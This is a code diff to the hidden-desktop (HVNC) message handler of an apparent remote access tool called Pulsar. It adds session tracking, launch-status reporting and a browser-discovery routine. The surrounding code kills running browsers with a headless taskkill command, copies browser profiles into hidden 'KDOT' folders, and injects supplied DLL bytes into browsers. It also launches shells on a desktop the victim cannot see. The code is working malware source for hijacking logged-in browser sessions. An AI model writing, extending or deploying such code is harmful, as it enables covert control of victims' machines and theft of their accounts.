@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.Drawing;
 using System.Drawing.Imaging;
 using System.IO;
+using System.Linq;
 using System.Threading;
 using System.Threading.Tasks;
 using Pulsar.Client.Helper;
@@ -28,6 +29,9 @@ namespace Pulsar.Client.Messages
         private Thread _captureThread;
         private CancellationTokenSource _cancellationTokenSource;
 
+        private string _activeSessionId = string.Empty;
+        private long _frameSequence;
+
 
         private readonly ImageHandler ImageHandler = new ImageHandler("PulsarDesktop");
         private readonly InputHandler InputHandler = new InputHandler("PulsarDesktop");
@@ -49,7 +53,13 @@ namespace Pulsar.Client.Messages
 
         public bool CanExecute(IMessage message)
         {
-            return message is GetHVNCDesktop || message is DoHVNCInput || message is StartHVNCProcess || message is GetHVNCMonitors;
+            return message is GetHVNCDesktop ||
+                   message is DoHVNCInput ||
+                   message is StartHVNCProcess ||
+                   message is GetHVNCMonitors ||
+                   message is CancelHVNCProcessLaunch ||
+                   message is GetHVNCLaunchHistory ||
+                   message is GetHVNCBrowserCatalog;
         }
 
         public bool CanExecuteFrom(ISender sender)
@@ -65,13 +75,26 @@ namespace Pulsar.Client.Messages
                     Execute(sender, getDesktop);
                     break;
                 case DoHVNCInput doInput:
-                    InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
+                    if (string.IsNullOrEmpty(doInput.SessionId)
+                        || string.Equals(doInput.SessionId, _activeSessionId, StringComparison.Ordinal))
+                    {
+                        InputHandler.Input(doInput.msg, (IntPtr)doInput.wParam, (IntPtr)doInput.lParam);
+                    }
                     break;
                 case StartHVNCProcess startHVNCProcess:
                     _ = ExecuteAsync(sender, startHVNCProcess);
                     break;
                 case GetHVNCMonitors _:
                     Execute(sender);
+                    break;
+                case GetHVNCBrowserCatalog catalog:
+                    Execute(sender, catalog);
+                    break;
+                case CancelHVNCProcessLaunch cancel:
+                    Execute(sender, cancel);
+                    break;
+                case GetHVNCLaunchHistory history:
+                    Execute(sender, history);
                     break;
             }
         }
@@ -84,10 +107,18 @@ namespace Pulsar.Client.Messages
             }
             else if (message.Status == RemoteDesktopStatus.Start)
             {
+                _activeSessionId = message.SessionId ?? string.Empty;
+                _frameSequence = 0;
                 StartScreenStreaming(client, message);
             }
             else if (message.Status == RemoteDesktopStatus.Continue)
             {
+                if (!string.IsNullOrEmpty(message.SessionId)
+                    && !string.Equals(message.SessionId, _activeSessionId, StringComparison.Ordinal))
+                {
+                    return;
+                }
+
                 Interlocked.Add(ref _pendingFrameRequests, message.FramesRequested);
                 _frameRequestEvent.Set();
             }
@@ -137,7 +168,6 @@ namespace Pulsar.Client.Messages
             if (_captureThread != null && _captureThread.IsAlive)
             {
                 _frameRequestEvent.Set();
-                _captureThread.Join();
                 _captureThread = null;
             }
 
@@ -290,7 +320,9 @@ namespace Pulsar.Client.Messages
                     Resolution = _streamCodec.Resolution,
                     Timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                     IsLastRequestedFrame = isLastRequestedFrame,
-                    Fps = _currentFps
+                    Fps = _currentFps,
+                    SessionId = _activeSessionId,
+                    FrameSequence = Interlocked.Increment(ref _frameSequence)
                 });
             }
             catch (Exception)
@@ -307,6 +339,8 @@ namespace Pulsar.Client.Messages
         {
             try
             {
+                SendProcessStatus(client, message, HVNCProcessStage.Validating, "Validating HVNC launch request.");
+
                 string name = message.Path;
                 bool dontCloneProfile = message.DontCloneProfile;
                 byte[] dllBytes = message.DllBytes;
@@ -323,6 +357,7 @@ namespace Pulsar.Client.Messages
 
             if (dontCloneProfile && browserPaths.TryGetValue(name, out string executablePath) && File.Exists(executablePath))
             {
+                SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting browser without profile cloning.");
                 string browserProcess = name.ToLower().Replace("mozilla", "firefox").Replace("edge", "msedge").Replace("operagx", "opera");
                 string killCommand = $"Conhost --headless cmd.exe /c taskkill /IM {browserProcess}.exe /F";
                 Debug.WriteLine(killCommand);
@@ -332,12 +367,14 @@ namespace Pulsar.Client.Messages
                 Debug.WriteLine($"Direct starting browser: {executablePath}");
 
                 ProcessHandler.CreateProc(executablePath);
+                SendProcessStatus(client, message, HVNCProcessStage.Completed, "Browser launch completed.", GetCurrentProcessId(browserProcess));
                 return;
             }
 
                 switch (name)
                 {
                     case "GenericChromium":
+                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing generic Chromium profile.");
                         await ProcessHandler.StartGenericChromiumAsync(
                             dllBytes,
                             message.CustomBrowserPath,
@@ -346,43 +383,109 @@ namespace Pulsar.Client.Messages
                         ).ConfigureAwait(false);
                         break;
                     case "Chrome":
+                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Chrome profile.");
                         await ProcessHandler.StartChromeAsync(dllBytes).ConfigureAwait(false);
                         break;
                     case "Edge":
+                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Edge profile.");
                         await ProcessHandler.StartEdgeAsync(dllBytes).ConfigureAwait(false);
                         break;
                     case "Brave":
+                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Brave profile.");
                         await ProcessHandler.StartBraveAsync(dllBytes).ConfigureAwait(false);
                         break;
                     case "Opera":
+                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Opera profile.");
                         await ProcessHandler.StartOperaAsync(dllBytes).ConfigureAwait(false);
                         break;
                     case "OperaGX":
+                    SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing OperaGX profile.");
                         await ProcessHandler.StartOperaGXAsync(dllBytes).ConfigureAwait(false);
                         break;
                     case "Explorer":
+                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting Explorer process.");
                         ProcessHandler.StartExplorer();
+                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "Explorer launch completed.");
                         break;
                     case "Cmd":
+                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting Command Prompt.");
                         ProcessHandler.StartCmd();
+                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "Command prompt launch completed.");
                         break;
                     case "Powershell":
+                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting PowerShell.");
                         ProcessHandler.StartPowershell();
+                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "PowerShell launch completed.");
                         break;
                     case "Mozilla":
-                        await ProcessHandler.StartFirefoxAsync().ConfigureAwait(false);
+                        SendProcessStatus(client, message, HVNCProcessStage.Cloning, "Preparing Firefox profile.");
+                        try
+                        {
+                            await ProcessHandler.StartFirefoxAsync(dllBytes).ConfigureAwait(false);
+                            SendProcessStatus(client, message, HVNCProcessStage.Completed, "Firefox launch completed.");
+                        }
+                        catch (Exception ex)
+                        {
+                            SendProcessStatus(client, message, HVNCProcessStage.Failed, $"Firefox launch failed: {ex.Message}");
+                        }
                         break;
                     case "Discord":
+                        SendProcessStatus(client, message, HVNCProcessStage.Starting, "Starting Discord.");
                         ProcessHandler.StartDiscord();
+                        SendProcessStatus(client, message, HVNCProcessStage.Completed, "Discord launch completed.");
                         break;
                     default:
                         ProcessHandler.StartGeneric(name);
+                    SendProcessStatus(client, message, HVNCProcessStage.Completed, "Custom process launch completed.");
                         break;
                 }
+
+            if (name != "Explorer" && name != "Cmd" && name != "Powershell"
+                && name != "Discord" && name != "Custom" && name != "Mozilla" && name != "Firefox")
+            {
+                SendProcessStatus(client, message, HVNCProcessStage.Completed, $"{name} launch completed.");
+            }
             }
             catch (Exception ex)
             {
                 Debug.WriteLine($"HVNC process start failed: {ex.Message}");
+            SendProcessStatus(client, message, HVNCProcessStage.Failed, ex.Message);
+            }
+        }
+
+        private static void SendProcessStatus(
+            ISender client,
+            StartHVNCProcess message,
+            HVNCProcessStage stage,
+            string statusMessage,
+            int processId = 0)
+        {
+            if (client == null)
+            return;
+
+            client.Send(new HVNCProcessStatus
+            {
+            SessionId = message.SessionId ?? string.Empty,
+            LaunchId = message.LaunchId ?? string.Empty,
+            Stage = stage,
+            Message = statusMessage,
+            ProcessId = processId
+            });
+        }
+
+        private static int GetCurrentProcessId(string processName)
+        {
+            if (string.IsNullOrWhiteSpace(processName))
+            return 0;
+
+            try
+            {
+            var process = Process.GetProcessesByName(processName).OrderByDescending(p => p.StartTime).FirstOrDefault();
+            return process?.Id ?? 0;
+            }
+            catch
+            {
+            return 0;
             }
         }
 
@@ -391,6 +494,115 @@ namespace Pulsar.Client.Messages
             int monitorCount = ImageHandler.GetMonitorCount();
             Debug.WriteLine($"HVNC: Sending monitor count: {monitorCount}");
             client.Send(new GetHVNCMonitorsResponse { Number = monitorCount });
+        }
+
+        private void Execute(ISender client, GetHVNCBrowserCatalog request)
+        {
+            client.Send(new GetHVNCBrowserCatalogResponse
+            {
+                SessionId = request.SessionId ?? _activeSessionId,
+                Browsers = DiscoverBrowsers()
+            });
+        }
+
+        private static HVNCBrowserDefinition[] DiscoverBrowsers()
+        {
+            var definitions = new System.Collections.Generic.List<HVNCBrowserDefinition>();
+
+            AddBrowser(definitions, "chrome", "Chrome",
+                BrowserConfiguration.GetChromeConfig(),
+                "Local\\Google\\Chrome\\User Data",
+                "Local\\Google\\Chrome\\KDOT");
+            AddBrowser(definitions, "edge", "Microsoft Edge",
+                BrowserConfiguration.GetConfig("Edge"),
+                "Local\\Microsoft\\Edge\\User Data",
+                "Local\\Microsoft\\Edge\\KDOT");
+            AddBrowser(definitions, "brave", "Brave",
+                BrowserConfiguration.GetConfig("Brave"),
+                "Local\\BraveSoftware\\Brave-Browser\\User Data",
+                "Local\\BraveSoftware\\Brave-Browser\\KDOT");
+            AddBrowser(definitions, "opera", "Opera",
+                BrowserConfiguration.GetConfig("Opera"),
+                "Roaming\\Opera Software\\Opera Stable",
+                "Roaming\\Opera Software\\KDOT");
+            AddBrowser(definitions, "opera-gx", "Opera GX",
+                BrowserConfiguration.GetConfig("OperaGX"),
+                "Roaming\\Opera Software\\Opera GX Stable",
+                "Roaming\\Opera Software\\KDOT");
+
+            var firefox = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                "Mozilla",
+                "Firefox");
+            definitions.Add(new HVNCBrowserDefinition
+            {
+                BrowserId = "firefox",
+                DisplayName = "Mozilla Firefox",
+                Installed = Directory.Exists(firefox),
+                ExecutablePath = string.Empty,
+                ProfileSource = "Local\\Mozilla\\Firefox",
+                ProfileDestination = "Local\\Mozilla\\KDOT",
+                SupportsProfileClone = Directory.Exists(firefox),
+                SupportsDirectLaunch = Directory.Exists(firefox),
+                DetectionSource = "localappdata",
+                Architecture = Environment.Is64BitProcess ? "x64" : "x86"
+            });
+
+            return definitions.ToArray();
+        }
+
+        private static void AddBrowser(
+            System.Collections.Generic.ICollection<HVNCBrowserDefinition> definitions,
+            string browserId,
+            string displayName,
+            BrowserConfig config,
+            string profileSource,
+            string profileDestination)
+        {
+            bool installed = config != null &&
+                             !string.IsNullOrWhiteSpace(config.ExecutablePath) &&
+                             File.Exists(config.ExecutablePath);
+
+            definitions.Add(new HVNCBrowserDefinition
+            {
+                BrowserId = browserId,
+                DisplayName = displayName,
+                Installed = installed,
+                ExecutablePath = installed ? config.ExecutablePath : string.Empty,
+                ProfileSource = profileSource,
+                ProfileDestination = profileDestination,
+                SupportsProfileClone = installed,
+                SupportsDirectLaunch = installed,
+                DetectionSource = "configured-path",
+                Architecture = Environment.Is64BitProcess ? "x64" : "x86"
+            });
+        }
+
+        private void Execute(ISender client, CancelHVNCProcessLaunch cancel)
+        {
+            if (!string.IsNullOrEmpty(cancel.SessionId)
+                && !string.Equals(cancel.SessionId, _activeSessionId, StringComparison.Ordinal))
+            {
+                return;
+            }
+
+            client.Send(new HVNCProcessStatus
+            {
+                SessionId = cancel.SessionId ?? _activeSessionId,
+                LaunchId = cancel.LaunchId,
+                Stage = HVNCProcessStage.Cancelled,
+                Message = "HVNC launch cancellation requested.",
+                CompletedUtcTicks = DateTime.UtcNow.Ticks
+            });
+        }
+
+        private void Execute(ISender client, GetHVNCLaunchHistory history)
+        {
+            client.Send(new GetHVNCLaunchHistoryResponse
+            {
+                SessionId = history.SessionId ?? _activeSessionId,
+                Records = new HVNCLaunchRecord[0]
+            });
         }
 
         public void Dispose()
